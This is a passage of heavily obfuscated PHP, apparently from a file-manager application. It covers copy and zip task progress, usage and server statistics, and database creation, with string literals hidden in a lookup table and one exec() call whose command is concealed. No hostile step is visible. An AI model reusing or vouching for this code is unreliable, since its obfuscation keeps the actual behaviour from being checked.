!$˜åÓ™”ö[$Ã¢€¯ÅÑ[870]]) { return; } if ($˜åÓ™”ö[$Ã¢€¯ÅÑ[2060]] == $Ã¢€¯ÅÑ[1336]) { $ÜŞ“Õ™® = $˜åÓ™”ö[$Ã¢€¯ÅÑ[1984]]; if ($˜åÓ™”ö[$Ã¢€¯ÅÑ[1985]] != $Ã¢€¯ÅÑ[1336]) { $ÜŞ“Õ™® = 0; } $éšë¡ã = ($˜åÓ™”ö[$Ã¢€¯ÅÑ[1988]] + $ÜŞ“Õ™®) / $˜åÓ™”ö[$Ã¢€¯ÅÑ[870]]; $˜åÓ™”ö[$Ã¢€¯ÅÑ[1931]] = $éšë¡ã * 0.3; } else { if ($˜åÓ™”ö[$Ã¢€¯ÅÑ[2060]] == $Ã¢€¯ÅÑ[390]) { $éšë¡ã = $˜åÓ™”ö[$Ã¢€¯ÅÑ[1930]] / $˜åÓ™”ö[$Ã¢€¯ÅÑ[1183]]; $˜åÓ™”ö[$Ã¢€¯ÅÑ[1931]] = 0.3 + $éšë¡ã * 0.5; } else { if ($˜åÓ™”ö[$Ã¢€¯ÅÑ[2060]] == $Ã¢€¯ÅÑ[108]) { $éšë¡ã = 0; if ($˜åÓ™”ö[$Ã¢€¯ÅÑ[1983]]) { $éšë¡ã = $˜åÓ™”ö[$Ã¢€¯ÅÑ[1984]] / $˜åÓ™”ö[$Ã¢€¯ÅÑ[1983]]; } $˜åÓ™”ö[$Ã¢€¯ÅÑ[1931]] = 0.3 + 0.5 + $éšë¡ã * 0.2; } } } if ($˜åÓ™”ö[$Ã¢€¯ÅÑ[1931]] > 0) { $ôÈ¦Â­Î = timeFloat() - $˜åÓ™”ö[$Ã¢€¯ÅÑ[1933]] - $˜åÓ™”ö[$Ã¢€¯ÅÑ[1936]]; $˜åÓ™”ö[$Ã¢€¯ÅÑ[1937]] = $ôÈ¦Â­Î * (1 - $˜åÓ™”ö[$Ã¢€¯ÅÑ[1931]]) / $˜åÓ™”ö[$Ã¢€¯ÅÑ[1931]]; } } public function copyFileStart($Ó¹¹ç, $Ëàáıƒ, $Ğãë–¼, $İÔüé½, $İêöŠ´¸, $ë†³Û£³) { $ÍáÑÎüò =& $_SERVER[Ï×Œõ”û]; parent::copyFileStart($Ó¹¹ç, $Ëàáıƒ, $Ğãë–¼, $İÔüé½, $İêöŠ´¸, $ë†³Û£³); $úÅè›¢ =& $this->task; if ($úÅè›¢[$ÍáÑÎüò[2060]] == $ÍáÑÎüò[390]) { $úÅè›¢[$ÍáÑÎüò[2060]] = $ÍáÑÎüò[108]; } $this->update(); } public function copyFileEnd($ƒ—åÈĞ§, $¯Á±œ©½, $ä”×Ä‘ı, $õŸ¡‚³…, $Û®†î, $êç£‹ÄÈ) { $ñôà…µÂ =& $_SERVER[Ï×Œõ”û]; $‰ª®ô³ª =& $this->task; $‰ª®ô³ª[$ñôà…µÂ[1984]] = $‰ª®ô³ª[$ñôà…µÂ[1983]]; $‰ª®ô³ª[$ñôà…µÂ[1988]] += $‰ª®ô³ª[$ñôà…µÂ[1983]]; $‰ª®ô³ª[$ñôà…µÂ[1985]] = $ñôà…µÂ[12]; $this->update(); } public function zipEvent($òºÉÂ«, $ë—´‘Á, $öñ§´¨‹, $‡š½‡ãÀ) { $Üªòº® =& $_SERVER[Ï×Œõ”û]; $…«Æ±ñî =& $this->task; $…«Æ±ñî[$Üªòº®[1981]] = get_path_this($ë—´‘Á); $…«Æ±ñî[$Üªòº®[1983]] = $‡š½‡ãÀ; $…«Æ±ñî[$Üªòº®[1984]] = $öñ§´¨‹; $…«Æ±ñî[$Üªòº®[1185]] = $òºÉÂ« == $Üªòº®[2068] ? $Üªòº®[2063] : $Üªòº®[2064]; $…«Æ±ñî[$Üªòº®[1985]] = $Üªòº®[12]; $…«Æ±ñî[$Üªòº®[870]] = $‡š½‡ãÀ; $…«Æ±ñî[$Üªòº®[2060]] = $Üªòº®[390]; $this->update(); } public function nameParse($£üÔ§™) { $ß˜ÂÈÓÍ =& $_SERVER[Ï×Œõ”û]; $ŞÓË¡ûœ =& $this->task; if ($ŞÓË¡ûœ[$ß˜ÂÈÓÍ[1930]] < $ŞÓË¡ûœ[$ß˜ÂÈÓÍ[1183]]) { $í’—Óª… = get_path_this($£üÔ§™); if (strstr($í’—Óª…, $ß˜ÂÈÓÍ[10])) { $ŞÓË¡ûœ[$ß˜ÂÈÓÍ[1930]] += 1; } } if ($ŞÓË¡ûœ[$ß˜ÂÈÓÍ[2060]] == $ß˜ÂÈÓÍ[1336]) { $ŞÓË¡ûœ[$ß˜ÂÈÓÍ[2060]] = $ß˜ÂÈÓÍ[390]; } $ŞÓË¡ûœ[$ß˜ÂÈÓÍ[1981]] = $£üÔ§™; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Õí×Šè®) { $ì‚Åå”Á =& $_SERVER[Ï×Œõ”û]; $ÅÖÊ¢“± = array($ì‚Åå”Á[690] => array($ì‚Åå”Á[33] => $ì‚Åå”Á[2069], $ì‚Åå”Á[353] => array($ì‚Åå”Á[284], $ì‚Åå”Á[872], $ì‚Åå”Á[2070], $ì‚Åå”Á[2071])), $ì‚Åå”Á[2072] => array($ì‚Åå”Á[33] => $ì‚Åå”Á[2073], $ì‚Åå”Á[353] => array($ì‚Åå”Á[284], $ì‚Åå”Á[870], $ì‚Åå”Á[2074], $ì‚Åå”Á[2075], $ì‚Åå”Á[2076]))); if (!isset($ÅÖÊ¢“±[$Õí×Šè®])) { return !1; } $this->optionType = $ÅÖÊ¢“±[$Õí×Šè®][$ì‚Åå”Á[33]]; $this->field = $ÅÖÊ¢“±[$Õí×Šè®][$ì‚Åå”Á[353]]; return !0; } public function listData($Ã§ÚÊù» = false, $˜àË = "\x6d\x6f\144\151\146\x79\124\x69\155\145", $°’Ê˜Òğ = false) { return parent::listData($Ã§ÚÊù», $˜àË, $°’Ê˜Òğ); } public function trendList($õ®ç¨ûó) { $È§ºŠÜİ =& $_SERVER[Ï×Œõ”û]; $æ•Ô£ßñ = $this->listData(); if ($æ•Ô£ßñ) { $ÒóšŒÍ = end($æ•Ô£ßñ); $¯½×¶Åù = date($È§ºŠÜİ[2077], strtotime($È§ºŠÜİ[2078])); if ($ÒóšŒÍ[$È§ºŠÜİ[284]] == $¯½×¶Åù) { return $æ•Ô£ßñ; } $”³åÕõ = strtotime($ÒóšŒÍ[$È§ºŠÜİ[284]]); } if (!isset($”³åÕõ)) { $Ïó’¼Ô = $õ®ç¨ûó == $È§ºŠÜİ[690] ? $È§ºŠÜİ[622] : $È§ºŠÜİ[939]; $”³åÕõ = Model($Ïó’¼Ô)->min($È§ºŠÜİ[233]); } $˜Àææ¬Û = $È§ºŠÜİ[2079] . ucfirst($õ®ç¨ûó); $¯íîã = $this->dateList($”³åÕõ); foreach ($¯íîã as $¯½×¶Åù) { $this->{$˜Àææ¬Û}($¯½×¶Åù); } return $this->listData(); } private function dateList($³İ´ÁÊš) { $Ü½êØ£° =& $_SERVER[Ï×Œõ”û]; $ÑËğ¨İ = $³İ´ÁÊš; $šş¡ëºó = strtotime($Ü½êØ£°[2078]); $ÓÉó—¡‡ = array(); while ($ÑËğ¨İ <= $šş¡ëºó) { $ÓÉó—¡‡[] = date($Ü½êØ£°[2077], $ÑËğ¨İ); $ÑËğ¨İ = strtotime($Ü½êØ£°[2080], $ÑËğ¨İ); } return $ÓÉó—¡‡; } public function _recordUser($•ÑÌ”ıï = '') { $è¦ÚÏÄ¹ =& $_SERVER[Ï×Œõ”û]; $çåü­¸÷ = strtotime(date($è¦ÚÏÄ¹[2081], strtotime($•ÑÌ”ıï))); $¥­¶ñø = strtotime(date($è¦ÚÏÄ¹[2082], strtotime($•ÑÌ”ıï))); $÷İ‡ë¶¿ = array($è¦ÚÏÄ¹[233] => array($è¦ÚÏÄ¹[1134], $¥­¶ñø)); $Ã’Í·Œì = Model($è¦ÚÏÄ¹[622])->where($÷İ‡ë¶¿)->count($è¦ÚÏÄ¹[1547]); $÷İ‡ë¶¿[$è¦ÚÏÄ¹[233]] = array($è¦ÚÏÄ¹[410], array($çåü­¸÷, $¥­¶ñø)); $„Ãª„³é = Model($è¦ÚÏÄ¹[622])->where($÷İ‡ë¶¿)->count($è¦ÚÏÄ¹[1547]); $÷İ‡ë¶¿[$è¦ÚÏÄ¹[33]] = $è¦ÚÏÄ¹[2083]; $Óº†ÕÌó = Model($è¦ÚÏÄ¹[2084])->where($÷İ‡ë¶¿)->count($è¦ÚÏÄ¹[2085]); $Ö›øş» = array($è¦ÚÏÄ¹[284] => $•ÑÌ”ıï, $è¦ÚÏÄ¹[872] => (int) $Ã’Í·Œì, $è¦ÚÏÄ¹[2070] => (int) $„Ãª„³é, $è¦ÚÏÄ¹[2071] => (int) $Óº†ÕÌó); return $this->insert($Ö›øş»); } public function _recordStore($Å™ÕµÑˆ = '') { $ÆÊ±æ§ =& $_SERVER[Ï×Œõ”û]; $àíœÈÂ¯ = strtotime(date($ÆÊ±æ§[2082], strtotime($Å™ÕµÑˆ))); $Ö©ñÂı = array($ÆÊ±æ§[233] => array($ÆÊ±æ§[1134], $àíœÈÂ¯)); $ö•ıòÑ– = Model($ÆÊ±æ§[565])->where($Ö©ñÂı)->sum($ÆÊ±æ§[79]); $Ö©ñÂı[$ÆÊ±æ§[505]] = 0; $íŸğĞŠ = Model($ÆÊ±æ§[939])->where($Ö©ñÂı)->sum($ÆÊ±æ§[79]); $Ö©ñÂı[$ÆÊ±æ§[190]] = 1; $ø­àù¾Å = Model($ÆÊ±æ§[939])->where($Ö©ñÂı)->sum($ÆÊ±æ§[79]); $Ö©ñÂı[$ÆÊ±æ§[190]] = 2; $÷ä©ÜÕ¾ = Model($ÆÊ±æ§[939])->where($Ö©ñÂı)->sum($ÆÊ±æ§[79]); $¶ÙÍâç = array($ÆÊ±æ§[284] => $Å™ÕµÑˆ, $ÆÊ±æ§[870] => (int) $íŸğĞŠ, $ÆÊ±æ§[2074] => (int) $ö•ıòÑ–, $ÆÊ±æ§[2075] => (int) $ø­àù¾Å, $ÆÊ±æ§[2076] => (int) $÷ä©ÜÕ¾); return $this->insert($¶ÙÍâç); } public function trend($´ôÜ»³Â, $Šµ¥Ç¨É) { $•ÓÈ©Şâ =& $_SERVER[Ï×Œõ”û]; if (!$this->init($´ôÜ»³Â)) { return !1; } $öŞúƒæş = $this->trendList($´ôÜ»³Â); if ($öŞúƒæş && $Šµ¥Ç¨É != $•ÓÈ©Şâ[1903]) { $Ù³á° = $öŞúƒæş[0][$•ÓÈ©Şâ[284]]; $îÆ¿¬»ö = $this->validDate($Šµ¥Ç¨É, $Ù³á°); $‡×°ÂÏ = array(); $œùşĞ’ = array_to_keyvalue($öŞúƒæş, $•ÓÈ©Şâ[284]); foreach ($îÆ¿¬»ö as $¸Š¼©®ä) { if (isset($œùşĞ’[$¸Š¼©®ä])) { $¢¿‡ŸÂş = $œùşĞ’[$¸Š¼©®ä]; } else { $¢¿‡ŸÂş = end($öŞúƒæş); $¢¿‡ŸÂş[$•ÓÈ©Şâ[284]] = $¸Š¼©®ä; if ($´ôÜ»³Â == $•ÓÈ©Şâ[690]) { $¢¿‡ŸÂş[$•ÓÈ©Şâ[2070]] = $¢¿‡ŸÂş[$•ÓÈ©Şâ[2071]] = 0; } } $‡×°ÂÏ[] = $¢¿‡ŸÂş; } $öŞúƒæş = $‡×°ÂÏ; } $¬Ò÷ÀÉ = array($•ÓÈ©Şâ[690] => array($•ÓÈ©Şâ[872] => LNG($•ÓÈ©Şâ[2086]), $•ÓÈ©Şâ[2070] => LNG($•ÓÈ©Şâ[2087]), $•ÓÈ©Şâ[2071] => LNG($•ÓÈ©Şâ[2088])), $•ÓÈ©Şâ[2072] => array($•ÓÈ©Şâ[870] => LNG($•ÓÈ©Şâ[2089]), $•ÓÈ©Şâ[2074] => LNG($•ÓÈ©Şâ[2090]), $•ÓÈ©Şâ[2075] => LNG($•ÓÈ©Şâ[2091]), $•ÓÈ©Şâ[2076] => LNG($•ÓÈ©Şâ[2092]))); $ñŠ£Äˆ = array($•ÓÈ©Şâ[690] => $•ÓÈ©Şâ[2093], $•ÓÈ©Şâ[2072] => $•ÓÈ©Şâ[79]); if (empty($öŞúƒæş)) { $¸Š¼©®ä = date($•ÓÈ©Şâ[2077], strtotime($•ÓÈ©Şâ[2078])); $Ö§“¾ïî = array($•ÓÈ©Şâ[284] => $¸Š¼©®ä); foreach ($¬Ò÷ÀÉ[$´ôÜ»³Â] as $×½æÁ => $ÒûÜùĞ) { $Ö§“¾ïî[$×½æÁ] = 0; } $öŞúƒæş[] = $Ö§“¾ïî; } $Ïøãâ‚ = array(); foreach ($öŞúƒæş as $ÒûÜùĞ) { if ($´ôÜ»³Â == $•ÓÈ©Şâ[2072] && $ÒûÜùĞ[$•ÓÈ©Şâ[2074]] > $ÒûÜùĞ[$•ÓÈ©Şâ[870]]) { $ÒûÜùĞ[$•ÓÈ©Şâ[2074]] = $ÒûÜùĞ[$•ÓÈ©Şâ[870]]; } foreach ($¬Ò÷ÀÉ[$´ôÜ»³Â] as $×½æÁ => $‘ù×ÉÙ») { $¢¿‡ŸÂş = array($•ÓÈ©Şâ[284] => $ÒûÜùĞ[$•ÓÈ©Şâ[284]], $•ÓÈ©Şâ[1818] => $‘ù×ÉÙ»); $¢¿‡ŸÂş[$ñŠ£Äˆ[$´ôÜ»³Â]] = isset($ÒûÜùĞ[$×½æÁ]) ? $ÒûÜùĞ[$×½æÁ] : 0; $Ïøãâ‚[] = $¢¿‡ŸÂş; } } return $Ïøãâ‚; } public function validDate($œˆºáàå, $ÓÍ˜ÕøÂ) { $ÑØ×¦•ƒ =& $_SERVER[Ï×Œõ”û]; $ªÏß”ÀÈ = date($ÑØ×¦•ƒ[2077], strtotime($ÑØ×¦•ƒ[2078])); $¨ÕúÁü¬ = array($ªÏß”ÀÈ); switch ($œˆºáàå) { case $ÑØ×¦•ƒ[1910]: $“‘òûçß = mktime(0, 0, 0, date($ÑØ×¦•ƒ[2094]), date($ÑØ×¦•ƒ[1613]) - date($ÑØ×¦•ƒ[1699]) + 7 - 7, date($ÑØ×¦•ƒ[2095])); $²„®¾ = 0; do { $ûôç¿Ô· = date($ÑØ×¦•ƒ[2077], $“‘òûçß - 3600 * 24 * 7 * $²„®¾); $¨ÕúÁü¬[] = $ûôç¿Ô·; $²„®¾++; } while ($ÓÍ˜ÕøÂ < $ûôç¿Ô·); break; case $ÑØ×¦•ƒ[1908]: $²„®¾ = 1; do { $ÓŠ²†Ûù = date($ÑØ×¦•ƒ[2096], strtotime("\x2d\40{$²„®¾}\40\x6d\x6f\156\x74\150\163")); $¨ÕúÁü¬[] = $ÓŠ²†Ûù; $²„®¾++; } while ($ÓÍ˜ÕøÂ < $ÓŠ²†Ûù); break; case $ÑØ×¦•ƒ[2097]: $³êÁûîÌ = (int) date($ÑØ×¦•ƒ[2095], strtotime($ÓÍ˜ÕøÂ)); $—õ‘°Ü = (int) date($ÑØ×¦•ƒ[2095]); if ($³êÁûîÌ >= $—õ‘°Ü) { break; } for ($³êÁûîÌ; $³êÁûîÌ < $—õ‘°Ü; $³êÁûîÌ++) { $¨ÕúÁü¬[] = $³êÁûîÌ . $ÑØ×¦•ƒ[2098]; } break; default: break; } if ($ÓÍ˜ÕøÂ > end($¨ÕúÁü¬)) { array_pop($¨ÕúÁü¬); } sort($¨ÕúÁü¬); return $¨ÕúÁü¬; } public function listTable($•çÕ…¨©) { $çù¿Şì– = ucfirst($•çÕ…¨©); return Model($çù¿Şì–)->listData(); } public function option($ÌŒğ¤û) { return call_user_func_array(array($this, $_SERVER[Ï×Œõ”û][2099] . ucfirst($ÌŒğ¤û)), array()); } private function optionUser() { $êøÒœ“Â =& $_SERVER[Ï×Œõ”û]; $ôÔ²¯µü = Model($êøÒœ“Â[622])->count($êøÒœ“Â[1547]); $»ö•‹ûó = Model($êøÒœ“Â[622])->where($êøÒœ“Â[2100])->count($êøÒœ“Â[1547]); $†¿æ¤Í– = intval($GLOBALS[$êøÒœ“Â[6]][$êøÒœ“Â[426]][$êøÒœ“Â[1876]]) / 3600; $æÓØ»ù = strtotime("\x2d{$†¿æ¤Í–}\40\150\157\x75\162\163"); $îéÈÉï = strtotime(date($êøÒœ“Â[2081])); if ($æÓØ»ù < $îéÈÉï) { $æÓØ»ù = $îéÈÉï; } $ÒÕí¥¾‰ = array($êøÒœ“Â[2101] => array($êøÒœ“Â[1135], $æÓØ»ù)); $ùÌ‚Øö‚ = (int) Model($êøÒœ“Â[622])->where($ÒÕí¥¾‰)->count($êøÒœ“Â[1547]); if (!$ùÌ‚Øö‚) { $ùÌ‚Øö‚ = 1; } $ÒÕí¥¾‰ = array($êøÒœ“Â[2101] => array($êøÒœ“Â[1135], $îéÈÉï)); $¤á„ôº = Model($êøÒœ“Â[622])->where($ÒÕí¥¾‰)->count($êøÒœ“Â[1547]); return array($êøÒœ“Â[865] => (int) $ôÔ²¯µü, $êøÒœ“Â[2102] => (int) ($ôÔ²¯µü - $»ö•‹ûó), $êøÒœ“Â[2103] => (int) $»ö•‹ûó, $êøÒœ“Â[2104] => (int) $¤á„ôº, $êøÒœ“Â[2105] => $ùÌ‚Øö‚); } private function optionFile() { $Šåç·Ê =& $_SERVER[Ï×Œõ”û]; $»í…ãˆÂ = $this->sourceSize(); $ÖıÌÀù„ = $»í…ãˆÂ[$Šåç·Ê[79]]; $‚„â¿›ğ = $»í…ãˆÂ[$Šåç·Ê[2074]]; $£„Ü™Åä = Model($Šåç·Ê[939])->where(array($Šåç·Ê[505] => 0))->count($Šåç·Ê[193]); $Ñ™öƒÇ„ = array($Šåç·Ê[505] => 0, $Šåç·Ê[233] => array($Šåç·Ê[1135], strtotime(date($Šåç·Ê[2081])))); $òÖÖê°œ = Model($Šåç·Ê[939])->where($Ñ™öƒÇ„)->sum($Šåç·Ê[79]); $ƒÇ´¥«… = Model($Šåç·Ê[939])->where($Ñ™öƒÇ„)->count($Šåç·Ê[193]); return array($Šåç·Ê[870] => $ÖıÌÀù„, $Šåç·Ê[2074] => $‚„â¿›ğ, $Šåç·Ê[2106] => $ÖıÌÀù„ - $‚„â¿›ğ, $Šåç·Ê[2107] => (int) $òÖÖê°œ, $Šåç·Ê[872] => (int) $£„Ü™Åä, $Šåç·Ê[2108] => (int) $ƒÇ´¥«…); } private function optionAccess() { $ÎÛ·š™¤ =& $_SERVER[Ï×Œõ”û]; return array($ÎÛ·š™¤[865] => $this->typeLogCnt(), $ÎÛ·š™¤[108] => $this->typeLogCnt($ÎÛ·š™¤[108]), $ÎÛ·š™¤[544] => $this->typeLogCnt($ÎÛ·š™¤[544]), $ÎÛ·š™¤[1285] => $this->typeLogCnt($ÎÛ·š™¤[1285]), $ÎÛ·š™¤[1516] => $this->typeLogCnt($ÎÛ·š™¤[1516]), $ÎÛ·š™¤[690] => $this->typeLogCnt($ÎÛ·š™¤[12], $ÎÛ·š™¤[2085])); } private function typeLogCnt($ÉÉŠíÉ = '', $ŞšÏÁÀØ = "\x69\144") { $Œ¥ “¥Ñ =& $_SERVER[Ï×Œõ”û]; $–¡àÃİÔ = array($Œ¥ “¥Ñ[108] => array($Œ¥ “¥Ñ[2109], $Œ¥ “¥Ñ[2110]), $Œ¥ “¥Ñ[544] => array($Œ¥ “¥Ñ[2111], $Œ¥ “¥Ñ[2112]), $Œ¥ “¥Ñ[1285] => array($Œ¥ “¥Ñ[2113], $Œ¥ “¥Ñ[2114], $Œ¥ “¥Ñ[2115]), $Œ¥ “¥Ñ[1516] => array($Œ¥ “¥Ñ[2116], $Œ¥ “¥Ñ[2117]), $Œ¥ “¥Ñ[1517] => array($Œ¥ “¥Ñ[2118], $Œ¥ “¥Ñ[2119], $Œ¥ “¥Ñ[2120])); $Å˜×ÀÉ­ = strtotime(date($Œ¥ “¥Ñ[2081])); $û¾³–°Í = array($Œ¥ “¥Ñ[233] => array($Œ¥ “¥Ñ[1135], $Å˜×ÀÉ­)); if ($ÉÉŠíÉ) { $û¾³–°Í[$Œ¥ “¥Ñ[33]] = array($Œ¥ “¥Ñ[7], $–¡àÃİÔ[$ÉÉŠíÉ]); } $³ºúı¡ = Model($Œ¥ “¥Ñ[2084])->where($û¾³–°Í)->count($ŞšÏÁÀØ); return (int) $³ºúı¡; } private function optionServer() { $Ÿ¸Ù›‡¨ =& $_SERVER[Ï×Œõ”û]; $‚¿İ¦ = $this->diskDriver(); $Ñ¶¤ÉãÅ = KodIO::defaultDriver(); $±Õ„–ü = array($Ÿ¸Ù›‡¨[932] => $Ñ¶¤ÉãÅ[$Ÿ¸Ù›‡¨[484]]); $ì“Ûûí± = Model($Ÿ¸Ù›‡¨[565])->where($±Õ„–ü)->sum($Ÿ¸Ù›‡¨[79]); $ôúÔÖÎ = explode($Ÿ¸Ù›‡¨[53], $_SERVER[$Ÿ¸Ù›‡¨[146]]); $“€ìİ¢º = $ôúÔÖÎ[0]; $Õºâ¬ê = $GLOBALS[$Ÿ¸Ù›‡¨[6]][$Ÿ¸Ù›‡¨[21]]; $ñÒÑ–„¼ = $Õºâ¬ê[$Ÿ¸Ù›‡¨[1097]]; if ($ñÒÑ–„¼ == $Ÿ¸Ù›‡¨[1085]) { $¢ıœ’¿ = explode($Ÿ¸Ù›‡¨[1427], $Õºâ¬ê[$Ÿ¸Ù›‡¨[1096]]); $ñÒÑ–„¼ = $¢ıœ’¿[0]; } if ($ñÒÑ–„¼ == $Ÿ¸Ù›‡¨[1033] || $ñÒÑ–„¼ == $Ÿ¸Ù›‡¨[910]) { $è¡™„âò = Model()->db()->query($Ÿ¸Ù›‡¨[2121]); $ §ôûœ´ = $è¡™„âò[0] && isset($è¡™„âò[0][$Ÿ¸Ù›‡¨[1817]]) ? $è¡™„âò[0][$Ÿ¸Ù›‡¨[1817]] : 0; $ñÒÑ–„¼ = $Ÿ¸Ù›‡¨[2122] . ($ §ôûœ´ ? $Ÿ¸Ù›‡¨[8] . $ §ôûœ´ : $Ÿ¸Ù›‡¨[12]); } $üãÚ‰¤´ = $GLOBALS[$Ÿ¸Ù›‡¨[6]][$Ÿ¸Ù›‡¨[426]][$Ÿ¸Ù›‡¨[941]]; return array($Ÿ¸Ù›‡¨[2123] => $‚¿İ¦ ? $‚¿İ¦[$Ÿ¸Ù›‡¨[2124]] : 0, $Ÿ¸Ù›‡¨[2125] => $‚¿İ¦ ? $‚¿İ¦[$Ÿ¸Ù›‡¨[2126]] : 0, $Ÿ¸Ù›‡¨[2127] => (int) $Ñ¶¤ÉãÅ[$Ÿ¸Ù›‡¨[2124]] * 1024 * 1024 * 1024, $Ÿ¸Ù›‡¨[2128] => (int) $ì“Ûûí±, $Ÿ¸Ù›‡¨[2129] => ucfirst($“€ìİ¢º), $Ÿ¸Ù›‡¨[2130] => $Ÿ¸Ù›‡¨[2131] . PHP_VERSION, $Ÿ¸Ù›‡¨[2132] => phpBuild64() ? 64 : 32, $Ÿ¸Ù›‡¨[864] => str_replace($Ÿ¸Ù›‡¨[1259], $Ÿ¸Ù›‡¨[1113], $ñÒÑ–„¼), $Ÿ¸Ù›‡¨[426] => ucfirst($üãÚ‰¤´), $Ÿ¸Ù›‡¨[32] => $_SERVER[$Ÿ¸Ù›‡¨[2133]]); } private function diskDriver() { $ñï¾â =& $_SERVER[Ï×Œõ”û]; $ë¯†»¦¶ = $ñï¾â[8]; $Ùë£Ÿ¤¤ = $GLOBALS[$ñï¾â[6]][$ñï¾â[1451]] == $ñï¾â[1452]; if ($Ùë£Ÿ¤¤) { $ë¯†»¦¶ = $ñï¾â[2134]; if (function_exists($ñï¾â[2135])) { exec($ñï¾â[2136], $Œ›†şÎ); $ë¯†»¦¶ = $Œ›†şÎ[1] . $ñï¾â[8]; } } if (!file_exists($ë¯†»¦¶)) { return; } if (!function_exists($ñï¾â[2137])) { return; } $‰Šºƒëº = @disk_total_space($ë¯†»¦¶); $ü“Ğó¢Š = $‰Šºƒëº - @disk_free_space($ë¯†»¦¶); return array($ñï¾â[2124] => $‰Šºƒëº, $ñï¾â[2126] => $ü“Ğó¢Š); } public function fileChart($˜÷»åûÇ) { $…ÊÔÛ« =& $_SERVER[Ï×Œõ”û]; if (isset($˜÷»åûÇ[$…ÊÔÛ«[1547]])) { return Model($…ÊÔÛ«[939])->userFileTypeProfile($˜÷»åûÇ[$…ÊÔÛ«[1547]]); } if (isset($˜÷»åûÇ[$…ÊÔÛ«[1449]])) { return Model($…ÊÔÛ«[939])->groupFileTypeProfile($˜÷»åûÇ[$…ÊÔÛ«[1449]]); } $Èë…ÌÂ« = $this->sourceSize(); $Ç®÷ªÌó = array($…ÊÔÛ«[192] => 0, $…ÊÔÛ«[190] => 1); $§ÈßÀÃ = Model($…ÊÔÛ«[939])->where($Ç®÷ªÌó)->sum($…ÊÔÛ«[79]); $Ç®÷ªÌó[$…ÊÔÛ«[190]] = 2; $ÕÑµÍÛå = Model($…ÊÔÛ«[939])->where($Ç®÷ªÌó)->sum($…ÊÔÛ«[79]); return array($…ÊÔÛ«[870] => $Èë…ÌÂ«[$…ÊÔÛ«[79]], $…ÊÔÛ«[2074] => $Èë…ÌÂ«[$…ÊÔÛ«[2074]], $…ÊÔÛ«[2075] => (int) $§ÈßÀÃ, $…ÊÔÛ«[2076] => (int) $ÕÑµÍÛå); } private function sourceSize() { $İÍ¥°§¼ =& $_SERVER[Ï×Œõ”û]; $¸¿¯ÚÉŞ = Model($İÍ¥°§¼[939])->where(array($İÍ¥°§¼[505] => 0))->sum($İÍ¥°§¼[79]); $ê¬å¦İ = Model($İÍ¥°§¼[565])->sum($İÍ¥°§¼[79]); if ($ê¬å¦İ > $¸¿¯ÚÉŞ) { $ê¬å¦İ = $¸¿¯ÚÉŞ; } return array($İÍ¥°§¼[79] => (int) $¸¿¯ÚÉŞ, $İÍ¥°§¼[2074] => (int) $ê¬å¦İ); } } goto cÉçÎ„ˆî; F•Ş…ºÃäÕ: class DbManage { function __construct($¦±ªÕĞş = array()) { $°Ä´À¢ª =& $_SERVER[Ï×Œõ”û]; if (empty($¦±ªÕĞş)) { $¦±ªÕĞş = $GLOBALS[$°Ä´À¢ª[6]][$°Ä´À¢ª[21]]; } $this->database = $¦±ªÕĞş; } public function model($¼ò§šæ = '') { return new ModelBase($¼ò§šæ, $_SERVER[Ï×Œõ”û][12], $this->database); } public function db($•…ôÀöı = false) { $øâÊƒ¿ =& $_SERVER[Ï×Œõ”û]; $—ñŞêÍñ = array_change_key_case($this->database); if ($this->dbType() == $øâÊƒ¿[13] || !$•…ôÀöı) { return $this->model()->db(); } $í“ä°•ô = $—ñŞêÍñ[$øâÊƒ¿[1093]]; $—ñŞêÍñ[$øâÊƒ¿[1093]] = $øâÊƒ¿[12]; if ($—ñŞêÍñ[$øâÊƒ¿[1088]] == $øâÊƒ¿[1085]) { $®Ó³ˆ¬İ = $—ñŞêÍñ[$øâÊƒ¿[1094]]; $—ñŞêÍñ[$øâÊƒ¿[1094]] = substr($®Ó³ˆ¬İ, 0, strrpos($®Ó³ˆ¬İ, $øâÊƒ¿[1180])); } $this->database = $—ñŞêÍñ; $Š»×‹€ = $this->model()->db(); try { $®µ¿ÀƒÁ = $Š»×‹€->execute("\163\150\157\x77\40\144\141\164\x61\x62\141\163\145\163\40\x6c\151\153\x65\40\x27{$í“ä°•ô}\x27"); } catch (Exception $ŞØåµÍ) { } if (!$®µ¿ÀƒÁ) { $Š»×‹€->execute("\143\x72\x65\141\164\145\x20\x64\x61\164\141\142\x61\x73\145\40\140{$í“ä°•ô}\x60"); } $—ñŞêÍñ[$øâÊƒ¿[1093]] = $í“ä°•ô; if ($—ñŞêÍñ[$øâÊƒ¿[1088]] == $øâÊƒ¿[1085]) { $—ñŞêÍñ[$øâÊƒ¿[1094]] .= $øâÊƒ¿[1180] . $í“ä°•ô; } $this->database = $—ñŞêÍñ; $Š»×‹€->execute("\165\x73\x65\40\140{$í“ä°•ô}\x60"); return $Š»×‹€; } public function createTable($Ùà„ı…, &$‡İ¾Ö•ú) { $ˆ¡”á˜ =& $_SERVER[Ï×Œõ”û]; if (!IO::exist($Ùà„ı…)) { show_json(LNG($ˆ¡”á˜[1181]), !1); } $ÜÙ½²¢î = $this->model()->db(); $Íƒ„ÓË¹ = sqlSplit(IO::getContent($Ùà„ı…)); foreach ($Íƒ„ÓË¹ as $ı´ƒ´ÓŠ) { $ôš³º­â = stripos($ı´ƒ´ÓŠ, $ˆ¡”á˜[1182]) === 0; if ($ôš³º­â) { $‡İ¾Ö•ú->task[$ˆ¡”á˜[1183]] += 1; } $ÜÙ½²¢î->execute($ı´ƒ´ÓŠ); if ($ôš³º­â) { preg_match($ˆ¡”á˜[1184], $ı´ƒ´ÓŠ, $³ÌİñÊŠ); $‡İ¾Ö•ú->task[$ˆ¡”á˜[1185]] = $³ÌİñÊŠ[1]; $‡İ¾Ö•ú->update(1); } } } public function insertTable($ …‡™‡ğ, &$õÈ°¾¶¥) { $²ÆÚ¦æ =& $_SERVER[Ï×Œõ”û]; $ıÅÊÛêš = $this->model()->db(); $ÓÉÁÓ‡ = $••å¼±Ù ? array($••å¼±Ù) : $ıÅÊÛêš->getTables(); foreach ($ …‡™‡ğ as $òğ¥¥á) { $••å¼±Ù = basename($òğ¥¥á, $²ÆÚ¦æ[899]); if (!in_array($••å¼±Ù, $ÓÉÁÓ‡)) { continue; } $õÈ°¾¶¥->task[$²ÆÚ¦æ[1185]] = $••å¼±Ù; if ($••å¼±Ù == $²ÆÚ¦æ[893]) { continue; } if (get_filesize($òğ¥¥á) == 0) { continue; } $Ù¿ÓˆÜ˜ = $this->sqlToDb($òğ¥¥á, $õÈ°¾¶¥); if (!$Ù¿ÓˆÜ˜) { 